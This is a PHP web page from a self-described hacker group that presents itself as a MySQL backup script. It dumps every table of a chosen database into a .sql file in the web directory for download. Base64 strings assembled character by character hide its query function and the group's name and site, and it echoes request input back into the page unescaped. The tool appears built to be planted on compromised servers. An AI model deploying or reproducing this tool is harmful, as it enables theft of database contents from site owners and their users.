<html>
<head>
<?php
header("Content-type:text/html; charset=gb2312");
/*******************Silic Group Hacker Army All Rights Reserved.*********************/
$cmd="YWJjaWtsbW9wcXJzdXlfZWc=";
$cmd2="16jTwyAtIHBocCZNeVNRTMr9vt2/4rG4t925pL7fIC0g";
$host=$_REQUEST['host'];
$uid=$_REQUEST['uid'];
$dbps=$_REQUEST['password'];
$db=$_REQUEST['db'];
$tip="&#23578;&#26410;&#35774;&#32622;&#65292;&#26080;&#27861;&#22791;&#20221;";
$f1=$HTTP_SERVER_VARS['php_self'];
$CODE=base64_decode($cmd);
$C0DE=base64_decode($cmd2);
$t1=$CODE{6}.$CODE{13}.$CODE{11}.$CODE{9}.$CODE{5}.$CODE{14}.$CODE{9}.$CODE{12}.$CODE{15}.$CODE{10}.$CODE{13};
$t2=$CODE{3}.$CODE{5}.$CODE{3}.$CODE{2};
$t3=$CODE{10}.$CODE{7}.$CODE{12}.$CODE{8};
$t4=$CODE{1}.$CODE{5}.$CODE{0}.$CODE{2}.$CODE{4}.$CODE{1}.$CODE{0}.$CODE{8}.".".$CODE{7}.$CODE{10}.$CODE{16};
$CODE=$dbps;
?>
<title><?php echo "S".$t2." G".$t3.$C0DE.$t4;?></title>
<?php
if (!empty($host) & !empty($uid) & !empty($db)){
$mysql_link=@mysql_connect($host,$uid,$dbps);
mysql_select_db($db);
$t1("SET NAMES gbk");
$mysql="";
$q1=mysql_query("show tables");
while($t=mysql_fetch_array($q1)){
  $table=$t[0];
  $q2=mysql_query("show create table `$table`");
  $sql=mysql_fetch_array($q2);
  $mysql.=$sql['Create Table'].";\r\n\r\n";
  $q3=mysql_query("select * from `$table`");
  while($data=mysql_fetch_assoc($q3))
    {
    $keys=array_keys($data);
    $keys=array_map('addslashes',$keys);
    $keys=join('`,`',$keys);    
    $keys="`".$keys."`";
    $vals=array_values($data);
    $vals=array_map('addslashes',$vals);
    $vals=join("','",$vals);
    $vals="'".$vals."'";
    $mysql.="insert into `$table`($keys) values($vals);\r\n";
    }
  $mysql.="\r\n";
}
$filename=date("Y-m-d-GisA").".sql";
$fp=fopen($filename,'w');
fputs($fp,$mysql);
fclose($fp);
$tip="<br><center>&#25968;&#25454;&#22791;&#20221;&#25104;&#21151;&#65292;&#25968;&#25454;&#24211;&#25991;&#20214;&#65306;<a href=\"".$filename."\">".$filename."</a></center>";
}?>
<style type="text/css">
html{background:#f7f7f7;}
p{font-size:10pt;}
.tx{font-family:Lucida Handwriting,Times New Roman;}
</style>
</head>
<body><center>
<form method="post" action="<?php echo $HTTP_SERVER_VARS['php_self'];?>?">
<br /><?php echo $tip;?><br />
<hr><br />
&#77;&#121;&#83;&#81;&#76;&#20027;&#26426;&#58;&#32;<input name="host" value="<?php echo $host;?>" type="text"  class="tx" size="15"><br /><br />
&#77;&#121;&#83;&#81;&#76;&#29992;&#25143;&#58;&#32;<input name="uid" value="<?php echo $uid;?>" type="text"  class="tx" size="15"><br /><br />
&#77;&#121;&#83;&#81;&#76;&#23494;&#30721;&#58;&#32;<input name="password" value="<?php echo $CODE;?>"  type="text" class="tx" size="15"><br /><br />
&#25968;&#25454;&#24211;&#21517;&#58;&#32;<input name="db" value="<?php echo $db;?>" type="text"  class="tx" size="15"><br /><br />
<input type="submit" value="<?php echo base64_decode("0ru8/LG4t90=");?>" tilte="Submit" style="width:120px;height:64px;"><hr><br />
<p class="tx">php MySQL Database Backup Script Powered By <a href="http://<?php echo $t4;?>/" target="_blank"><?php echo "S".$t2." G".$t3." &#72;&#97;&#99;&#107;&#101;&#114;&#32;&#65;&#114;&#109;&#121;";?></a>&copy;2009-2012</p>
</form>
</center></body></html>
